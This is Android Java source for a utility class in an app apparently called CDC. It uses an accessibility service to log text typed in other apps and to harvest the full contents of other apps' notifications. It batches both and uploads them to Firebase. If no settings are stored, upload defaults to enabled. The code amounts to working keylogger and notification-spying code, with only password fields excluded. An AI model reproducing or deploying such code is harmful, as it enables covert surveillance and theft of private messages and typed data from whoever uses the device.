package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.convertToString;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.DeviceData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.services.CDCAccessibilityService;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;

public class AccessibilityUtils {

    private static final long BATCH_INTERVAL_MS = 15000; // Batch every 15 seconds
    private static final int MAX_BATCH_SIZE = 5; // Process when entries exceed 5
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final List<KeyStrokeData> textChanges = new ArrayList<>();
    private static final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private static boolean isBatchTimerScheduled = false;

    public static void startAccessibilitySettingIntent(Context context) {
        if (!isAccessibilityServiceEnabled(context, CDCAccessibilityService.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            context.startActivity(intent);
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends android.accessibilityservice.AccessibilityService> service) {
        String serviceId = context.getPackageName() + "/" + service.getName();
        String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        LoggerUtils.d("AccessibilityUtils", "Checking service: " + serviceId + " | Enabled: " + enabledServices);
        if (enabledServices == null) return false;

        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(\u0027:\u0027);
        splitter.setString(enabledServices);
        while (splitter.hasNext()) {
            String componentName = splitter.next();
            if (componentName.equalsIgnoreCase(serviceId) || componentName.contains(service.getSimpleName())) {
                return true;
            }
        }
        return false;
    }

    public static void processTextChangedEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

        // Ignore noise from keyboard apps and system components
        if (packageName.equals("android") 
                || packageName.contains("com.android.systemui") 
                || packageName.contains("com.vikasyadavnsit.cdc")
                || packageName.contains("com.google.android.inputmethod")) {
            return;
        }

        android.view.accessibility.AccessibilityNodeInfo node = event.getSource();
        if (node == null) return;

        // Security: Never capture password fields
        if (node.isPassword()) return;

        boolean isEditable = node.isEditable();
        String extractedText = "";

        // CORE FILTERING LOGIC:
        // 1. If it's a standard text change event, it's almost certainly typing.
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            extractedText = event.getText().stream().map(CharSequence::toString).collect(Collectors.joining());
        } 
        // 2. For background window/focus changes (which bring in suggestions/comments), 
        //    ONLY capture if the node is an active input field (isEditable).
        else if (isEditable && (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED)) {
            if (node.getText() != null) {
                extractedText = node.getText().toString();
            }
        }

        if (TextUtils.isEmpty(extractedText)) return;

        String cleanedText = extractedText.trim();
        if (cleanedText.isEmpty()) return;

        synchronized (textChanges) {
            boolean processed = false;
            if (!textChanges.isEmpty()) {
                KeyStrokeData lastEntry = textChanges.get(textChanges.size() - 1);
                
                if (lastEntry.getAppPackage().equals(packageName)) {
                    // Smart Merge: If text is growing (typing) or slightly shrinking (backspace)
                    if (cleanedText.startsWith(lastEntry.getText()) || lastEntry.getText().startsWith(cleanedText)) {
                        // Only update if the length is different to avoid duplicate "same-text" snapshots from focus events
                        if (cleanedText.length() != lastEntry.getText().length()) {
                            lastEntry.setText(cleanedText);
                            lastEntry.setTimestamp(String.valueOf(System.currentTimeMillis()));
                            lastEntry.setTyped(true);
                        }
                        processed = true;
                    }
                }
            }

            if (!processed) {
                textChanges.add(KeyStrokeData.builder()
                        .appPackage(packageName)
                        .text(cleanedText)
                        .timestamp(String.valueOf(System.currentTimeMillis()))
                        .typed(true) // We are now only capturing what is essentially "typed" context
                        .build());
            }

            // Trigger batch upload
            if (textChanges.size() >= MAX_BATCH_SIZE) {
                handler.removeCallbacks(processTextChangesRunnable);
                handler.post(processTextChangesRunnable);
                isBatchTimerScheduled = true;
            } else if (!isBatchTimerScheduled) {
                handler.postDelayed(processTextChangesRunnable, BATCH_INTERVAL_MS);
                isBatchTimerScheduled = true;
            }
        }
    }

    private static final Runnable processTextChangesRunnable = new Runnable() {
        @Override
        public void run() {
            List<KeyStrokeData> textBatch;
            synchronized (textChanges) {
                isBatchTimerScheduled = false;
                if (textChanges.isEmpty()) {
                    return;
                }
                textBatch = new ArrayList<>(textChanges);
                textChanges.clear();
            }
            executorService.execute(() -> processTextChanges(textBatch));
        }
    };

    private static void processTextChanges(List<KeyStrokeData> textBatch) {
        LoggerUtils.d("AccessibilityUtils", "Attempting to publish keystroke batch: " + textBatch.size() + " items");
        ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.CAPTURE_KEY_STROKES.name());
        
        User.AppTriggerSettingsData appTriggerSettingsData;
        if (appData == null || appData.getValue() == null) {
            LoggerUtils.w("AccessibilityUtils", "Trigger settings not found in DB. Defaulting to ENABLED for this batch.");
            appTriggerSettingsData = User.AppTriggerSettingsData.builder()
                    .enabled(true)
                    .uploadDataSnapshot(true)
                    .saveOnLocalFile(false)
                    .build();
        } else {
            appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);
        }

        if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {
            LoggerUtils.i("AccessibilityUtils", "Publishing " + textBatch.size() + " keystrokes to Firebase");
            for (KeyStrokeData keyStrokeData : textBatch) {
                if (appTriggerSettingsData.isSaveOnLocalFile()) {
                    String keyStrokeText = "Package :" + keyStrokeData.getAppPackage() + " Text :" + keyStrokeData.getText();
                    FileUtils.appendDataToFile(FileMap.KEYSTROKE, keyStrokeText);
                }

                if (appTriggerSettingsData.isUploadDataSnapshot())
                    FirebaseUtils.uploadUserKeystrokeDataSnapshot(keyStrokeData);

                DeviceDataRepository.insert(DeviceData.builder()
                        .value(new Gson().toJson(keyStrokeData))
                        .fileMapType(FileMap.KEYSTROKE)
                        .build());
            }
        } else {
            LoggerUtils.d("AccessibilityUtils", "Keystroke capture is disabled in settings. Batch discarded.");
        }
    }

    public static void processNotificationEvent(AccessibilityEvent event) {
        try {
            Notification notification = (Notification) event.getParcelableData();
            NotificationData notificationData = NotificationData.builder().build();

            if (Objects.nonNull(notification) && Objects.nonNull(notification.extras)) {
                Map<String, Object> map = new HashMap<>();
                for (String key : notification.extras.keySet()) {
                    Object data = notification.extras.get(key);
                    if (Objects.nonNull(data)) {
                        map.put(key.replace(".", "_"), convertToString(data));
                    }
                }
                notificationData.setExtras(map);
                notificationData.setTimestamp(String.valueOf(System.currentTimeMillis()));
            } else {
                notificationData.setExtras(Map.of("data", event.getText().stream().collect(Collectors.joining(", "))));
                notificationData.setTimestamp(String.valueOf(System.currentTimeMillis()));
            }
            notificationData.setPackageName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
            collectNotificationData(notificationData);
        } catch (Exception e) {
            e.printStackTrace();
            LoggerUtils.e("AccessibilityUtils", "Exception in processNotificationEvent :: " + e.getMessage());
        }
    }

    public static void collectNotificationData(NotificationData notificationData) {
        String pkg = notificationData.getPackageName();
        boolean isCdcAlert = "com.vikasyadavnsit.cdc".equals(pkg);
        
        LoggerUtils.d("AccessibilityUtils", "Collecting notification from: " + pkg);
        
        ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.REQUEST_NOTIFICATION_ACCESS.name());
        User.AppTriggerSettingsData settings = null;
        if (appData != null && appData.getValue() != null) {
            settings = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);
        }

        // Always capture internal CDC alerts for delivery tracking
        // For other apps, check if capture is enabled and global trigger is ON
        if (isCdcAlert || (settings != null && settings.isEnabled() && settings.isCaptureEnabled())) {
            LoggerUtils.d("AccessibilityUtils", "Notification capture proceeding (CDC Alert or Sync Enabled)");
            
            if (settings != null && settings.isSaveOnLocalFile())
                FileUtils.appendDataToFile(FileMap.NOTIFICATION, notificationData.toString());

            if (settings == null || settings.isUploadDataSnapshot())
                FirebaseUtils.uploadUserNotificationDataSnapshot(notificationData);

            DeviceDataRepository.insert(DeviceData.builder()
                    .value(new Gson().toJson(notificationData)).fileMapType(FileMap.NOTIFICATION).build());
        } else {
            LoggerUtils.d("AccessibilityUtils", "Notification capture skipped: sync is disabled.");
        }
    }

}
